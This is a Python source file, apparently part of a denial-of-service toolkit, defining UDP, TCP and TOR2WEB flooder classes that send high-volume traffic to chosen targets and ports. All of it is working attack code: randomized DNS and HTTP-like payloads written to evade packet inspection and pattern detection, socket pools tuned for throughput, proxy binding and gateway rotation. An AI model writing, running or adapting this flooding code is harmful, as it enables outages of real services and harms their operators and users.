import random
import struct
import threading
import time
import os
import socket
import queue
import logging
import shutil
from typing import List, Dict, Optional
from contextlib import contextmanager
from .utilities import AttackModule, UI, Style

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

class UDPFlooder(AttackModule):
    def __init__(self, targets: List[str], ports: List[int], duration: int = 60, 
                 threads: int = 5, debug: bool = False, proxy_manager=None, skip_prompt: bool = False):
        super().__init__(targets, ports, skip_prompt)
        self.duration = duration
        self.threads = threads
        self.debug = debug
        self.proxy_manager = proxy_manager
        
        # Initialize logger
        self.logger = logging.getLogger(self.__class__.__name__)
        if debug:
            self.logger.setLevel(logging.DEBUG)
        else:
            self.logger.setLevel(logging.INFO)
        
        # Calculate packet size based on thread count
        self.packet_size = self.calculate_packet_size(threads, base_size=1024)
        
        self.aggressive_mode = True  # Enable aggressive mode by default
        self.dns_domains = [
            'google.com', 'facebook.com', 'youtube.com', 'amazon.com', 
            'cloudflare.com', 'microsoft.com', 'apple.com', 'netflix.com',
            'twitter.com', 'instagram.com', 'linkedin.com', 'github.com',
            'ovh.com', 'ovh.net', 'ovhcloud.com'  # Added OVH domains
        ]
        
        # Performance optimization settings
        self.sockets_per_thread = 32  # Increased from 8
        self.packet_cache_size = 250  # Increased from 100
        self.target_bandwidth = 50 * 1024 * 1024  # Increased to 50 MB/s target
        
        # Socket pool management
        self.socket_pools = [{} for _ in range(self.sockets_per_thread)]
        self.socket_pool_locks = [threading.Lock() for _ in range(self.sockets_per_thread)]
        
        # Advanced timing and burst control
        self.burst_size = 5000  # Increased from 1000
        self.min_burst_interval = 0.0001  # Decreased for higher throughput
        self.adaptive_timing = True
        
        # Add rate limiting - but with higher limits
        self.packets_per_second = self.target_bandwidth / self.packet_size
        self.interval = 1.0 / self.packets_per_second
        
        # Packet generation optimization
        self.use_memory_efficient_payloads = True
        self.precomputed_payload_sizes = [1024, 2048, 4096, 8192, 16384, 30720, 61440]  # Added larger sizes
        
        self.payload_pool = {}
        self.payload_pool_lock = threading.Lock()
        
        # Add performance monitoring attributes
        self.perf_data = {
            "last_packets": 0,
            "last_bytes": 0,
            "last_time": time.time(),
            "current_pps": 0,
            "current_mbps": 0,
            "highest_pps": 0,
            "highest_mbps": 0
        }
        
        # Initialize payload pool
        self.initialize_payload_pool()
        
        self.status_format = "[{timestamp}] Target: {target} | Port: {port} | Method: UDPFLOODER | PPS: {pps:,.2f} | BPS: {mbps:.2f} MB | Success Rate: {rate:d}%"
        self.status_length = len(self.status_format.format(
            timestamp="00:00:00",
            target="000.000.000.000",
            port="00000",
            pps=0.0,
            mbps=0.0,
            rate=100
        ))
        
    def initialize_payload_pool(self):
        """Pre-generate payload patterns for various ports and sizes"""
        UI.print_info("Initializing optimized payload pool...")
        
        # For each port type, generate pattern templates
        self.payload_templates = {}
        
        # DNS payload templates (port 53)
        self.payload_templates[53] = []
        for _ in range(20):  # Increased from 10 to 20 different DNS query templates
            transaction_id = random.randint(0, 65535)
            flags = random.choice([0x0100, 0x8000, 0x8180, 0x8580])
            qdcount = random.randint(1, 5)  # Increased max queries
            ancount = random.randint(0, 3)  # Increased max answers
            nscount = random.randint(0, 3)  # Increased max name servers
            arcount = random.randint(0, 3)  # Increased max additional records
            
            # Create the DNS header
            header = struct.pack('!HHHHHH',
                transaction_id,
                flags,
                qdcount,
                ancount,
                nscount,
                arcount
            )
            
            # Generate a domain template with more randomness
            domain_template = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789-', k=12)) + '.' + random.choice(self.dns_domains)
            
            self.payload_templates[53].append({
                'header': header,
                'domain_template': domain_template,
                'qdcount': qdcount
            })
        
        # Generate generic payload patterns for other ports with more variety
        self.payload_patterns = {}
        for size in self.precomputed_payload_sizes:
            # Create different pattern types
            self.payload_patterns[size] = []
            
            # Add more pattern variations (10 instead of 3)
            # 1. Completely random binary data
            for _ in range(3):
                self.payload_patterns[size].append(random.randbytes(size))
            
            # 2. Repeating patterns with different chunk sizes
            for chunk_size in [16, 32, 64]:
                if chunk_size < size:
                    pattern = random.randbytes(chunk_size)
                    repeated = pattern * (size // len(pattern) + 1)
                    self.payload_patterns[size].append(repeated[:size])
            
            # 3. ASCII printable characters
            for _ in range(2):
                ascii_pattern = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=size)).encode()
                self.payload_patterns[size].append(ascii_pattern[:size])
            
            # 4. HTTP-like patterns to bypass DPI
            if size >= 64:
                http_methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS']
                http_method = random.choice(http_methods)
                http_path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
                http_host = random.choice(['example.com', 'google.com', 'cloudflare.com', 'akamai.net'])
                http_req = f"{http_method} {http_path} HTTP/1.1\r\nHost: {http_host}\r\n\r\n".encode()
                
                # Pad to desired size
                if len(http_req) < size:
                    padding = random.randbytes(size - len(http_req))
                    http_req += padding
                
                self.payload_patterns[size].append(http_req[:size])
        
    def get_optimized_payload(self, port: int, size: Optional[int] = None) -> bytes:
        """Get an optimized payload for the given port and size"""
        if size is None:
            size = random.choice(self.precomputed_payload_sizes)
            if size > self.packet_size:
                size = self.packet_size
        
        # For DNS port, generate specialized DNS query
        if port == 53:
            template = random.choice(self.payload_templates[53])
            header = template['header']
            
            # Generate a unique subdomain
            prefix = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16))
            domain = template['domain_template'].replace('abcdefgh', prefix)
            
            # Build question section with multiple queries
            questions = b''
            for _ in range(template['qdcount']):
                question = b''
                parts = domain.split('.')
                for part in parts:
                    encoded_part = part.encode('ascii')
                    question += struct.pack('B', len(encoded_part)) + encoded_part
                question += b'\x00'
                
                # Randomize query types for variety
                qtype = random.choice([1, 28, 33, 255])
                question += struct.pack('!HH', qtype, 1)  # QTYPE and QCLASS
                questions += question
            
            # Combine header and questions
            dns_query = header + questions
            
            # Add padding with random data to reach desired size
            if len(dns_query) < size:
                padding_size = size - len(dns_query)
                padding = random.randbytes(padding_size)
                dns_query += padding
            
            return dns_query
        
        # For other ports, use optimized pattern
        else:
            # Find the closest size in our precomputed patterns
            closest_size = min(self.precomputed_payload_sizes, key=lambda x: abs(x - size))
            
            # Get a random pattern of that size
            pattern = random.choice(self.payload_patterns[closest_size])
            
            # If exact size match, return as is
            if len(pattern) == size:
                return pattern
            
            # Otherwise, truncate or pad
            if len(pattern) > size:
                return pattern[:size]
            else:
                padding = random.randbytes(size - len(pattern))
                return pattern + padding
    
    def get_socket(self, target, port, pool_index=0):
        """Get or create a socket for the target:port combination from specified pool"""
        key = f"{target}:{port}"
        
        with self.socket_pool_locks[pool_index]:
            if key not in self.socket_pools[pool_index]:
                with self.create_socket() as sock:
                    # Enhanced socket configuration with larger buffer sizes
                    try:
                        # Set larger buffer sizes for higher throughput
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16 * 1024 * 1024)
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 16 * 1024 * 1024)
                        
                        # Try to set priority, but don't fail if not root
                        try:
                            sock.setsockopt(socket.SOL_SOCKET, socket.SO_PRIORITY, 7)
                        except PermissionError:
                            if self.debug:
                                self.logger.debug("Cannot set socket priority - requires root privileges")
                        
                        # Address reuse and port reuse
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                        if hasattr(socket, 'SO_REUSEPORT'):  # Linux systems
                            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
                        
                        # Try to disable UDP checksum, but don't fail if not supported
                        if hasattr(socket, 'UDP_CHECKSUM_COVERAGE'):  # Linux systems
                            try:
                                sock.setsockopt(socket.SOL_UDP, socket.UDP_CHECKSUM_COVERAGE, 0)
                            except (PermissionError, AttributeError):
                                if self.debug:
                                    self.logger.debug("Cannot disable UDP checksum - requires root privileges")
                        
                        # For performance, set non-blocking mode
                        sock.setblocking(False)
                    except Exception as e:
                        self.logger.debug(f"Socket option error: {e}")
                        raise
                
                    # If using proxies, try to bind to a proxy
                    if self.proxy_manager:
                        proxy = self.proxy_manager.get_proxy()
                        if proxy:
                            try:
                                proxy_ip, proxy_port = proxy.split(':')
                                sock.bind((proxy_ip, int(proxy_port)))
                                if self.debug:
                                    UI.print_info(f"Using proxy {proxy} for {target}:{port}")
                            except Exception as e:
                                if self.debug:
                                    UI.print_error(f"Failed to use proxy {proxy}: {e}")
                    
                    # For DNS ports, try to use random source ports (if running as root)
                    if port == 53:
                        try:
                            if os.geteuid() == 0:  # Running as root
                                random_port = random.randint(1024, 65000)
                                sock.bind(('0.0.0.0', random_port))
                        except (AttributeError, OSError):
                            pass
                    
                    self.socket_pools[pool_index][key] = sock
            
            return self.socket_pools[pool_index][key]
    
    def flood_target(self, target: str, port: int):
        """Worker function that sends UDP packets with optimized performance"""
        self.logger.debug(f"Starting flood worker for {target}:{port}")
        # Create multiple sockets for this worker
        sockets = [self.get_socket(target, port, i % self.sockets_per_thread) for i in range(self.sockets_per_thread)]
        
        # Pre-generate larger payload cache with varied sizes for unpredictability
        payloads = []
        for _ in range(self.packet_cache_size):
            # Vary packet sizes to avoid pattern detection
            size = random.choice(self.precomputed_payload_sizes)
            payloads.append(self.get_optimized_payload(port, size))
        
        payload_index = 0
        
        # Calculate burst parameters based on target bandwidth
        target_pps = self.target_bandwidth / self.packet_size
        packets_per_burst = min(self.burst_size, max(1000, int(target_pps * 0.5)))  # Increased from 0.2
        
        # Adaptive timing parameters
        last_burst_time = time.time()
        socket_index = 0
        success_count = 0
        failure_count = 0
        
        # Batch sending setup - increased for higher throughput
        max_batch_size = 256  # Increased from 128
        current_batch = 0
        
        # For DNS attacks, we want different subdomains each time
        if port == 53:
            dns_refresh_counter = 0
        
        last_packet_time = time.time() - 0.1  # Start with a slight offset to send immediately
        
        while self.running:
            try:
                # Batch sending for higher throughput
                for _ in range(max_batch_size):
                    # Send one packet
                    sock = sockets[socket_index]
                    socket_index = (socket_index + 1) % len(sockets)
                    
                    payload = payloads[payload_index]
                    payload_index = (payload_index + 1) % len(payloads)
                    
                    try:
                        sock.sendto(payload, (target, port))
                        success_count += 1
                        self.increment_stat("packets_sent")
                        self.increment_stat("bytes_sent", len(payload))
                        self.increment_stat("successful")
                    except (socket.error, OSError):
                        failure_count += 1
                        self.increment_stat("failures")
                        
                        # Recreate socket on failure
                        try:
                            sockets[socket_index] = self.get_socket(target, port, socket_index % self.sockets_per_thread)
                        except:
                            pass
                
                # Minimal sleep between batches to prevent CPU overload
                time.sleep(0.0001)
                    
            except Exception as e:
                if self.debug:
                    UI.print_error(f"Error in flood_target: {str(e)}")
                time.sleep(0.0005)  # Reduced sleep time on error
        
        # Cleanup
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
    
    def start(self):
        """Start the UDP flood operation"""
        super().start()
        
        UI.print_header("UDP Flood Operation")
        UI.print_info(f"Starting UDP flood against {len(self.targets)} targets on {len(self.ports)} ports")
        
        # Show configuration
        print(f"\n{Style.BOLD}Configuration:{Style.RESET}")
        print(f"- Packet size: {self.packet_size:,} bytes")
        print(f"- Threads per target/port: {self.threads} (with {self.sockets_per_thread} sockets each)")
        print(f"- Duration: {self.duration} seconds")
        print(f"- Aggressive mode: {'Enabled' if self.aggressive_mode else 'Disabled'}")
        print(f"- Target bandwidth: {self.target_bandwidth/(1024*1024):.0f} MB/s")
        
        # Special handling for DNS ports
        if 53 in self.ports:
            UI.print_info("DNS port (53) detected - Using enhanced DNS attack techniques")
            
            # Check if running as root/admin for raw socket access
            try:
                is_root = os.geteuid() == 0
            except AttributeError:
                # Windows or other OS without geteuid()
                is_root = False
            
            if is_root:
                UI.print_success("Running as root - full UDP flooding capabilities enabled")
            else:
                UI.print_warning("Not running as root - some DNS flooding capabilities will be limited")
                UI.print_info("For maximum DNS flooding effectiveness, run with sudo")
        
        # Show estimated packet rate based on threads
        est_pps = self.threads * len(self.targets) * len(self.ports) * 100  # Estimate 100 pps per thread
        UI.print_info(f"Estimated packet rate: ~{est_pps:,} packets/second")
        
        # Start worker threads for each target and port
        total_threads = len(self.targets) * len(self.ports) * self.threads
        
        UI.print_info(f"Launching {total_threads} worker threads...")
        
        thread_count = 0
        for target in self.targets:
            for port in self.ports:
                for _ in range(self.threads):
                    thread = threading.Thread(target=self.flood_target, args=(target, port))
                    thread.daemon = True
                    thread.start()
                    self.thread_list.append(thread)
                    thread_count += 1
                    
                    # Show progress every 10 threads
                    if thread_count % 10 == 0 or thread_count == total_threads:
                        UI.print_progress_bar(thread_count, total_threads, 
                                           prefix=f"Threads: {thread_count}/{total_threads}", 
                                           length=30)
        
        # Start only the performance monitoring thread
        perf_thread = threading.Thread(target=self.monitor_performance)
        perf_thread.daemon = False  # Changed to non-daemon
        perf_thread.start()
        
        # Run for specified duration
        try:
            UI.print_info(f"Operation running for {self.duration} seconds (Press Ctrl+C to stop)")
            time.sleep(self.duration)
        except KeyboardInterrupt:
            UI.print_warning("Operation interrupted by user")
        
        # Stop operation
        self.stop()
        
        # Print final summary
        elapsed = time.time() - self.start_time
        mbps = (self.stats["bytes_sent"] * 8) / (elapsed * 1000 * 1000) if elapsed > 0 else 0
        pps = self.stats["packets_sent"] / elapsed if elapsed > 0 else 0
        
        UI.print_header("Operation Summary")
        print(f"- Duration: {elapsed:.2f} seconds")
        print(f"- Total packets sent: {self.stats['packets_sent']:,}")
        print(f"- Failed packets: {self.stats['failures']:,}")
        print(f"- Total data sent: {self.stats['bytes_sent'] / (1024*1024):.2f} MB")
        print(f"- Average speed: {mbps:.2f} Mbps ({pps:.0f} packets/sec)")
        print(f"- Peak performance: {self.perf_data['highest_mbps']:.2f} Mbps ({self.perf_data['highest_pps']:.0f} packets/sec)")
    
    @contextmanager
    def create_socket(self):
        """Context manager to create and cleanup UDP sockets"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            yield sock
        finally:
            try:
                sock.close()
            except:
                pass

    def monitor_performance(self):
        """Monitor and display performance metrics"""
        last_update = time.time()
        last_stats = self.stats.copy()
        
        while self.running:
            try:
                time.sleep(1.0)  # Update every second
                current_time = time.time()
                elapsed = current_time - last_update
                
                if elapsed >= 1.0:
                    current_stats = self.stats.copy()
                    
                    # Calculate rates
                    pps = (current_stats["packets_sent"] - last_stats["packets_sent"]) / elapsed
                    bytes_sent = current_stats["bytes_sent"] - last_stats["bytes_sent"]
                    mbps = (bytes_sent * 8) / (1024 * 1024 * elapsed)
                    
                    # Update peak metrics 
                    if pps > self.perf_data["highest_pps"]:
                        self.perf_data["highest_pps"] = pps
                    if mbps > self.perf_data["highest_mbps"]:
                        self.perf_data["highest_mbps"] = mbps
                    
                    # Calculate success rate
                    total = current_stats["packets_sent"]
                    success_rate = int((current_stats["successful"] / total * 100) 
                                     if total > 0 else 0)
                    
                    # Format status line
                    timestamp = time.strftime("%H:%M:%S", time.localtime())
                    for target in self.targets:
                        for port in self.ports:
                            status_line = self.status_format.format(
                                timestamp=timestamp,
                                target=target,
                                port=port,
                                pps=pps,
                                mbps=mbps,
                                rate=success_rate
                            )
                            print(status_line)
                    
                    # Update tracking values
                    last_stats = current_stats.copy()
                    last_update = current_time
                    
            except Exception as e:
                if self.debug:
                    self.logger.error(f"Error in performance monitoring: {e}")
                time.sleep(1)

class TCPFlooder(AttackModule):
    def __init__(self, targets: List[str], ports: List[int], duration: int = 60,
                 threads: int = 5, debug: bool = False, proxy_manager=None, skip_prompt: bool = False):
        super().__init__(targets, ports, skip_prompt)
        self.duration = duration
        self.threads = threads
        self.debug = debug
        self.proxy_manager = proxy_manager
        
        # Calculate packet size based on thread count
        self.packet_size = self.calculate_packet_size(threads, base_size=1024)
        
        # Enhanced performance settings
        self.sockets_per_thread = 512  # Increased from 256
        self.connection_timeout = 0.5  # Reduced timeout for faster retries
        self.max_failures_per_target = 10000  # Increased
        self.reconnect_delay = 0.001  # Reduced delay
        self.send_buffer_size = 65536  # Increased buffer size
        # Update packet sizes for more aggressive sending
        self.packet_sizes = [
            self.packet_size,         # Base size (30KB)
            self.packet_size * 2,     # Double (60KB)
            self.packet_size * 4      # Quad (120KB)
        ]
        self.aggressive_mode = True
        self.retry_count = 5  # Increased retries
        self.backoff_delay = 0.1  # Reduced backoff
        self.last_stat_update = time.time()
        self.stat_update_interval = 1.0
        
        # Pre-generate payloads
        self.payload_cache = [os.urandom(size) for size in self.packet_sizes]
        
        # Performance monitoring
        self.perf_data = {
            "last_packets": 0,
            "last_bytes": 0,
            "last_time": time.time(),
            "current_pps": 0,
            "current_mbps": 0,
            "highest_pps": 0,
            "highest_mbps": 0,
            "bytes_sent": 0
        }
        self._monitor_thread = None
        
        self.status_format = "[{timestamp}] Target: {target} | Port: {port} | Method: TCPFLOODER | PPS: {pps:,.2f} | BPS: {mbps:.2f} MB | Success Rate: {rate:d}%"
        self.status_length = len(self.status_format.format(
            timestamp="00:00:00",
            target="000.000.000.000",
            port="00000",
            pps=0.0,
            mbps=0.0,
            rate=100
        ))

        # Initialize logger
        self.logger = logging.getLogger(self.__class__.__name__)
        if debug:
            self.logger.setLevel(logging.DEBUG)
        else:
            self.logger.setLevel(logging.INFO)
            
        # Calculate packet size based on thread count
        self.packet_size = self.calculate_packet_size(threads, base_size=1024)
        
        # Enhanced performance settings
        self.sockets_per_thread = 512  # Increased from 256
        self.connection_timeout = 0.5  # Reduced timeout for faster retries
        self.max_failures_per_target = 10000  # Increased
        self.reconnect_delay = 0.001  # Reduced delay
        self.send_buffer_size = 65536  # Increased buffer size
        # Update packet sizes for more aggressive sending
        self.packet_sizes = [
            self.packet_size,         # Base size (30KB)
            self.packet_size * 2,     # Double (60KB)
            self.packet_size * 4      # Quad (120KB)
        ]
        self.aggressive_mode = True
        self.retry_count = 5  # Increased retries
        self.backoff_delay = 0.1  # Reduced backoff
        self.last_stat_update = time.time()
        self.stat_update_interval = 1.0
        
        # Pre-generate payloads
        self.payload_cache = [os.urandom(size) for size in self.packet_sizes]
        
        # Performance monitoring
        self.perf_data = {
            "last_packets": 0,
            "last_bytes": 0,
            "last_time": time.time(),
            "current_pps": 0,
            "current_mbps": 0,
            "highest_pps": 0,
            "highest_mbps": 0,
            "bytes_sent": 0
        }
        self._monitor_thread = None
        
        self.status_format = "[{timestamp}] Target: {target} | Port: {port} | Method: TCPFLOODER | PPS: {pps:,.2f} | BPS: {mbps:.2f} MB | Success Rate: {rate:d}%"
        self.status_length = len(self.status_format.format(
            timestamp="00:00:00",
            target="000.000.000.000",
            port="00000",
            pps=0.0,
            mbps=0.0,
            rate=100
        ))

        if debug:
            self.logger.setLevel(logging.DEBUG)

        # Initialize stats dictionary
        self.stats = {
            "packets_sent": 0,
            "bytes_sent": 0,
            "successful": 0, 
            "failures": 0
        }
        self.stats_lock = threading.Lock()
        
    def increment_stat(self, stat_name: str, value: int = 1):
        """Thread-safe increment of stats"""
        with self.stats_lock:
            self.stats[stat_name] += value

    def start(self):
        """Start TCP flood operation"""
        super().start()
        
        UI.print_header("TCP Flood Operation")
        UI.print_info(f"Starting TCP flood against {len(self.targets)} targets on {len(self.ports)} ports")
        
        # Configuration info
        print(f"\n{Style.BOLD}Configuration:{Style.RESET}")
        print(f"- Threads per target/port: {self.threads}")
        print(f"- Duration: {self.duration} seconds")
        print(f"- Sockets per thread: {self.sockets_per_thread}")
        
        # Launch threads
        total_threads = len(self.targets) * len(self.ports) * self.threads
        UI.print_info(f"Launching {total_threads} worker threads...")
        
        thread_count = 0
        for target in self.targets:
            for port in self.ports:
                for _ in range(self.threads):
                    thread = threading.Thread(target=self.flood_target, args=(target, port))
                    thread.daemon = True
                    thread.start()
                    self.thread_list.append(thread)
                    thread_count += 1
                    
                    if thread_count % 10 == 0 or thread_count == total_threads:
                        UI.print_progress_bar(thread_count, total_threads,
                                           prefix=f"Threads: {thread_count}/{total_threads}",
                                           length=30)
        
        # Start performance monitoring thread
        self._monitor_thread = threading.Thread(target=self.monitor_performance)
        self._monitor_thread.daemon = False
        self._monitor_thread.start()
        
        # Run for duration
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()
            self._print_final_stats()

    def _print_final_stats(self):
        """Print final statistics"""
        elapsed = time.time() - self.start_time
        pps = self.stats["packets_sent"] / elapsed if elapsed > 0 else 0
        mbps = (self.stats["bytes_sent"] * 8) / (1024 * 1024 * elapsed) if elapsed > 0 else 0
        
        UI.print_header("Operation Summary")
        print(f"- Duration: {elapsed:.2f} seconds")
        print(f"- Total connections: {self.stats['successful']:,}")
        print(f"- Failed connections: {self.stats['failures']:,}")
        print(f"- Total data sent: {self.stats['bytes_sent'] / (1024*1024):.2f} MB")
        print(f"- Average speed: {pps:.0f} packets/sec ({mbps:.2f} Mbps)")
        print(f"- Peak performance: {self.perf_data['highest_pps']:.0f} packets/sec")

    def flood_target(self, target: str, port: int):
        """Optimized TCP flood worker with retry logic"""
        self.logger.debug(f"Starting flood worker for {target}:{port}")
        sockets = []
        failures = 0
        retry_count = 0
        
        while self.running and failures < self.max_failures_per_target:
            try:
                # Create new socket with optimized settings
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.connection_timeout)
                
                # Enhanced socket options
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, self.send_buffer_size)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                
                try:
                    # Attempt connection with retry logic
                    for attempt in range(self.retry_count):
                        try:
                            sock.connect((target, port))
                            # Connection successful
                            sockets.append(sock)
                            self.increment_stat("successful")
                            self.increment_stat("packets_sent")
                            retry_count = 0  # Reset retry counter on success
                            
                            # Send multiple payloads per connection
                            for _ in range(3):  # Send 3 payloads per connection
                                payload = random.choice(self.payload_cache)
                                sock.send(payload)
                                self.increment_stat("bytes_sent", len(payload))
                            break
                            
                        except (socket.timeout, ConnectionRefusedError) as e:
                            if attempt < self.retry_count - 1:
                                time.sleep(self.backoff_delay * (attempt + 1))
                                continue
                            raise
                    
                    # Maintain socket pool size
                    if len(sockets) > self.sockets_per_thread:
                        old_sock = sockets.pop(0)
                        try:
                            old_sock.shutdown(socket.SHUT_RDWR)
                            old_sock.close()
                        except:
                            pass
                            
                except Exception as e:
                    failures += 1
                    self.increment_stat("failures")
                    retry_count += 1
                    
                    if retry_count >= 5:  # Back off after 5 consecutive failures
                        time.sleep(self.backoff_delay)
                        retry_count = 0
                    
                    if self.debug and failures % 100 == 0:
                        UI.print_error(f"Connection failed to {target}:{port} - {str(e)}")
                    
                    try:
                        sock.close()
                    except:
                        pass
                    
                    continue
                
                # Brief pause between connection attempts
                time.sleep(self.reconnect_delay)
                
            except Exception as e:
                failures += 1
                self.increment_stat("failures")
                if self.debug:
                    UI.print_error(f"Socket creation failed: {str(e)}")
                time.sleep(self.reconnect_delay)
        
        # Cleanup
        for sock in sockets:
            try:
                sock.shutdown(socket.SHUT_RDWR)
                sock.close()
            except:
                pass

class TOR2WebFlooder(AttackModule):
    def __init__(self, targets: List[str], ports: List[int], duration: int = 60, 
                 threads: int = 5, debug: bool = False, skip_prompt: bool = False):
        super().__init__(targets, ports, skip_prompt)
        self.duration = duration
        self.threads = threads
        self.debug = debug
        
        # TOR2WEB gateway list
        self.tor2web_gateways = [
            'onion.ws', 'onion.pet', 'onion.ly', 'onion.sh', 'onion.lu',
            'onion.cab', 'onion.city', 'onion.direct', 'onion.link',
            'onion.top', 'onion.si', 'onion.plus', 'onion.rip',
            'tor2web.org', 'tor2web.fi', 'tor2web.io', 'tor2web.xyz'
        ]
        
        # Connection settings
        self.timeout = 10
        self.max_retries = 3
        self.verify_ssl = False
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        ]

        if debug:
            self.logger.setLevel(logging.DEBUG)

    def get_tor2web_url(self, target: str, gateway: str) -> str:
        """Convert target to TOR2WEB URL format"""
        # Handle .onion addresses specially
        if '.onion' in target:
            return f"https://{target.replace('.onion', '')}.{gateway}"
        return f"https://{target}.{gateway}"

    def flood_worker(self, target: str, port: int):
        """Worker thread for TOR2WEB flooding"""
        import requests
        from requests.exceptions import RequestException
        
        session = requests.Session()
        session.verify = self.verify_ssl
        failures = 0
        
        while self.running:
            try:
                # Rotate through gateways
                gateway = random.choice(self.tor2web_gateways)
                url = self.get_tor2web_url(target, gateway)
                
                # Set random user agent
                headers = {'User-Agent': random.choice(self.user_agents)}
                
                # Send request through TOR2WEB gateway
                response = session.get(
                    url,
                    headers=headers,
                    timeout=self.timeout,
                    allow_redirects=True
                )
                
                # Track successful requests
                if response.status_code:
                    self.increment_stat("successful")
                    self.increment_stat("bytes_sent", len(response.content))
                    
            except RequestException as e:
                failures += 1
                self.increment_stat("failures")
                if self.debug and failures % 100 == 0:
                    UI.print_error(f"TOR2WEB request failed: {str(e)}")
                time.sleep(0.1)

    def start(self):
        """Start TOR2WEB flood operation"""
        super().start()
        
        # Check dependencies
        try:
            import requests
        except ImportError:
            UI.print_error("Please install required package: pip install requests")
            return
        
        UI.print_header("TOR2WEB Flood Operation")
        UI.print_info(f"Starting TOR2WEB flood against {len(self.targets)} targets")
        
        # Show configuration
        print(f"\n{Style.BOLD}Configuration:{Style.RESET}")
        print(f"- Threads per target: {self.threads}")
        print(f"- Duration: {self.duration} seconds")
        print(f"- Available gateways: {len(self.tor2web_gateways)}")
        
        # Launch worker threads
        total_threads = len(self.targets) * self.threads
        UI.print_info(f"Launching {total_threads} TOR2WEB worker threads...")
        
        thread_count = 0
        for target in self.targets:
            for _ in range(self.threads):
                thread = threading.Thread(target=self.flood_worker, args=(target, 80))
                thread.daemon = True
                thread.start()
                self.thread_list.append(thread)
                thread_count += 1
                
                if thread_count % 10 == 0 or thread_count == total_threads:
                    UI.print_progress_bar(thread_count, total_threads,
                                       prefix=f"Threads: {thread_count}/{total_threads}",
                                       length=30)
        
        # Start stats thread
        stats_thread = threading.Thread(target=self.monitor_performance)
        stats_thread.daemon = True
        stats_thread.start()
        
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            UI.print_warning("Operation interrupted by user")
        
        self.stop()
        
        # Print summary
        elapsed = time.time() - self.start_time
        rps = self.stats["successful"] / elapsed if elapsed > 0 else 0
        
        UI.print_header("Operation Summary")
        print(f"- Duration: {elapsed:.2f} seconds")
        print(f"- Total requests: {self.stats['successful']:,}")
        print(f"- Failed requests: {self.stats['failures']:,}")
        print(f"- Average rate: {rps:.0f} requests/sec")

